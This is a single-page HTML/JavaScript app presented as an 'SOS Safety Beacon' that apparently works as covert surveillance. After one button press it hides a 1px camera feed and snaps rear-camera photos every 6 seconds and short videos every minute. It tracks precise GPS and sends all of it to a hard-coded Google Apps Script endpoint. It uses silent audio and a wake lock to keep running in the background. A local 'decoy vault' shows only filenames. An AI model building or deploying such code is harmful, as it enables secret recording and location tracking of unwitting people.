<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOS Safety Beacon Pro</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #0d0d0d; color: #f5f5f5; text-align: center; margin: 0; padding: 20px; }
        .box { max-width: 380px; margin: 0 auto; background: #141414; padding: 25px 20px; border-radius: 16px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
        h2 { font-size: 22px; font-weight: 600; margin: 0 0 5px 0; letter-spacing: -0.5px; }
        .subtitle { font-size: 12px; color: #777; margin: 0 0 25px 0; }
        .sq-btn { border: 2px solid #fff; font-size: 18px; font-weight: 700; cursor: pointer; width: 180px; height: 180px; margin: 20px auto; color: #fff; display: block; transition: all 0.2s ease; letter-spacing: 0.5px; }
        .start { background: #e63946; box-shadow: 0 0 25px rgba(230,57,70,0.4); border-color: #ff4d5a; border-radius: 0px !important; }
        .start:active { transform: scale(0.96); background: #cc2e3a; }
        .stop { background: #1d3557; box-shadow: 0 0 25px rgba(29,53,87,0.4); border-color: #2a4b7c; border-radius: 0px !important; display: none; }
        .stop:active { transform: scale(0.96); background: #132239; }
        #status { margin-top: 20px; font-size: 13px; color: #f1faee; background: #1d1d1d; padding: 12px; border-radius: 8px; border: 1px solid #2a2a2a; }
        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; }
        canvas { display: none; }
        .vault { margin-top: 30px; border-top: 1px dashed #2b2b2b; padding-top: 20px; display: none; }
        h4 { font-size: 13px; color: #999; margin: 0 0 10px 0; text-align: left; font-weight: 500; }
        .f-list { text-align: left; background: #0a0a0a; padding: 12px; border-radius: 6px; font-size: 11px; max-height: 110px; overflow-y: auto; color: #a8dadc; font-family: monospace; border: 1px solid #1a1a1a; }
        .ctrl-panel { margin-top: 15px; text-align: right; }
        .v-btn { background: transparent; color: #555; border: none; padding: 4px 8px; cursor: pointer; font-size: 11px; transition: color 0.2s; }
        .v-btn:hover { color: #888; }
        .db-btn { color: #2a7b4c; }
        .db-btn:hover { color: #3aa667; }
        #dbDump { background: #050505; color: #39ff14; padding: 10px; text-align: left; font-size: 10px; font-family: monospace; white-space: pre-wrap; display: none; border: 1px solid #222; border-radius: 6px; margin-top: 10px; max-height: 120px; overflow-y: auto; }
    </style>
</head>
<body>
<div class="box">
    <h2>Safety Beacon Pro</h2>
    <div class="subtitle">Loop Tracking Active Framework</div>
    <button id="startBtn" class="sq-btn start" onclick="startEmit()">🚨 INITIATE<br>SQUARE BROADCAST</button>
    <button id="stopBtn" class="sq-btn stop" onclick="stopEmit()">⏹️ STOP<br>BROADCAST</button>
    <div id="status">System armed and ready for transmission...</div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <div id="decoyVault" class="vault">
        <h4>📂 Storage Sandbox</h4>
        <div id="fileList" class="f-list">No local entries tracked yet.</div>
        <div class="ctrl-panel">
            <button class="v-btn db-btn" onclick="viewLocal()">inspect data rows</button>
            <button class="v-btn" onclick="wipeLocal()">clear cache</button>
        </div>
        <div id="dbDump"></div>
    </div>
</div>
<script>
    // 🔗 Your exact live script cloud connection URL is fully added into line 3 below
    const googleScriptUrl = "https://script.google.com/macros/s/AKfycbzhkaLbAkNRPfGVNykf_srPuNO_-mcHcJ_Lk5ekGJN42s9UtTXqbUFBECVyCAXqv6oN/exec"; 
    let activeStream = null, packetRecorder = null, videoChunks = [];
    let isBroadcasting = false, db = null, wakeLock = null, silentAudioInterval = null, audioCtx = null;
    let currentLat = "Unknown", currentLon = "Unknown", gpsAccuracy = "0";

    const request = indexedDB.open("LocalDecoyVault", 1);
    request.onupgradeneeded = (e) => e.target.result.createObjectStore("files", { keyPath: "id" });
    request.onsuccess = (e) => db = e.target.result;

    async function activateBackgroundBypass() {
        try { if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); } catch(e){}
        try {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            silentAudioInterval = setInterval(() => {
                if (!isBroadcasting) return;
                let osc = audioCtx.createOscillator(), gain = audioCtx.createGain();
                osc.type = 'sine'; osc.frequency.setValueAtTime(1, audioCtx.currentTime); 
                gain.gain.setValueAtTime(0.001, audioCtx.currentTime);
                osc.connect(gain); gain.connect(audioCtx.destination);
                osc.start(); osc.stop(audioCtx.currentTime + 0.1);
            }, 1000);
        } catch(e){}
    }

    async function selectWideAngleCamera() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(d => d.kind === 'videoinput');
            let selectedDeviceId = null;
            for (let device of videoDevices) {
                const label = device.label.toLowerCase();
                if (label.includes('wide') || label.includes('ultra') || label.includes('back 1') || label.includes('0.5x')) {
                    selectedDeviceId = device.deviceId;
                    break;
                }
            }
            const constraints = {
                video: selectedDeviceId ? { deviceId: { exact: selectedDeviceId } } : { facingMode: "environment" },
                audio: false 
            };
            constraints.video.width = { ideal: 640 }; 
            constraints.video.height = { ideal: 480 };
            activeStream = await navigator.mediaDevices.getUserMedia(constraints);
            const videoElement = document.getElementById('video');
            videoElement.srcObject = activeStream;
            await videoElement.play();
            return true;
        } catch (err) {
            try {
                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: 640, height: 480 }, audio: false });
                const videoElement = document.getElementById('video');
                videoElement.srcObject = activeStream;
                await videoElement.play();
                return true;
            } catch(e) { 
                document.getElementById('status').innerText = "System Camera Permissions Blocked!"; 
                return false;
            }
        }
    }

    async function startEmit() {
        if(isBroadcasting) return;
        document.getElementById('status').innerText = "Syncing camera stream components...";
        const cameraReady = await selectWideAngleCamera();
        if (!cameraReady) return;
        await activateBackgroundBypass();
        isBroadcasting = true;
        document.getElementById('startBtn').style.display = "none";
        document.getElementById('stopBtn').style.display = "block";
        document.getElementById('decoyVault').style.display = "block";
        document.getElementById('status').innerText = "Broadcast active. Logging synchronization loops...";
        document.getElementById('status').style.color = "#e63946";
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                (pos) => {
                    currentLat = pos.coords.latitude.toFixed(5);
                    currentLon = pos.coords.longitude.toFixed(5);
                    gpsAccuracy = Math.round(pos.coords.accuracy);
                }, 
                null, 
                { enableHighAccuracy: true }
            );
        }
        runBackgroundPhotoLoop();
        runBackgroundVideoLoop();
    }

    function runBackgroundPhotoLoop() { if (!isBroadcasting) return; executePhotoCapture(); setTimeout(runBackgroundPhotoLoop, 6000); }
    function runBackgroundVideoLoop() { if (!isBroadcasting) return; executeVideoIntervalBlock(); setTimeout(runBackgroundVideoLoop, 60000); }

    function stopEmit() {
        isBroadcasting = false; clearInterval(silentAudioInterval); if (wakeLock) wakeLock.release();
        if (packetRecorder && packetRecorder.state === "recording") packetRecorder.stop();
        if (activeStream) { activeStream.getTracks().forEach(t => t.stop()); activeStream = null; }
        document.getElementById('startBtn').style.display = "block";
        document.getElementById('stopBtn').style.display = "none";
        document.getElementById('status').innerText = "Broadcast Terminated. Standby.";
        document.getElementById('status').style.color = "#28a745";
    }

    function executePhotoCapture() {
        const video = document.getElementById('video'), canvas = document.getElementById('canvas'), ctx = canvas.getContext('2d');
        canvas.width = 640; canvas.height = 480;
        try {
            ctx.drawImage(video, 0, 0, 640, 480);
            let dataUrl = canvas.toDataURL('image/jpeg', 0.7); 
            let base64Str = dataUrl.substring(dataUrl.indexOf(',') + 1); 
            let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
            transmitPacketToCloud({ type: "photo", image: base64Str, latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime });
            saveToDecoyLocalVault("Photo_" + cleanTime + ".jpg", "Lt[" + currentLat + "] Lg[" + currentLon + "] ac[" + gpsAccuracy + "m]");
        } catch (e) { console.error(e); }
    }

    function executeVideoIntervalBlock() {
        videoChunks = [];
        let options = { mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/mp4' };
        try {
            packetRecorder = new MediaRecorder(activeStream, options);
            packetRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) videoChunks.push(e.data); };
            packetRecorder.onstop = () => {
                if (videoChunks.length === 0) return;
                const videoBlob = new Blob(videoChunks, { type: options.mimeType });
                const reader = new FileReader();
                reader.readAsDataURL(videoBlob);
                reader.onloadend = () => {
                    const rawResult = reader.result;
                    const base64Video = rawResult.substring(rawResult.indexOf(',') + 1); 
                    const cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
                    transmitPacketToCloud({ type: "video", videoData: base64Video, latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime });
                    saveToDecoyLocalVault("Vid_" + cleanTime + ".mp4", "Lt[" + currentLat + "] Lg[" + currentLon + "] ac[" + gpsAccuracy + "m]");
                };
            };
            packetRecorder.start();
            setTimeout(() => { if (packetRecorder && packetRecorder.state === "recording") packetRecorder.stop(); }, 10000); 
        } catch (e) { console.error(e); }
    }

    function transmitPacketToCloud(payload) {
        fetch(googleScriptUrl, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(err => console.error(err));
    }

    function saveToDecoyLocalVault(filename, details) {
        if (!db) return;
        const tx = db.transaction("files", "readwrite");
        tx.objectStore("files").put({ id: filename, details: details, time: new Date().toLocaleTimeString() });
        tx.oncomplete = () => {
            let div = document.getElementById("fileList"); if (div.innerText.includes("No local")) div.innerHTML = "";
            div.innerHTML += "<div>📄 " + filename + " -> " + details + "</div>";
        };
    }

    function wipeLocal() {
        if (!db) return;
        db.transaction("files", "readwrite").objectStore("files").clear().oncomplete = () => {
            document.getElementById("fileList").innerHTML = "<div>Cache data wiped clean.</div>";
            document.getElementById("dbDump").style.display = "none";
        };
    }

    function viewLocal() {
        if (!db) return;
        db.transaction("files", "readonly").objectStore("files").getAll().onsuccess = (e) => {
            let el = document.getElementById("dbDump");
            el.style.display = el.style.display === "block" ? "none" : "block";
            el.innerText = "=== CACHE RECORD MATRIX ===\n" + JSON.stringify(e.target.result, null, 2);
        };
    }
</script>
</body>
</html>
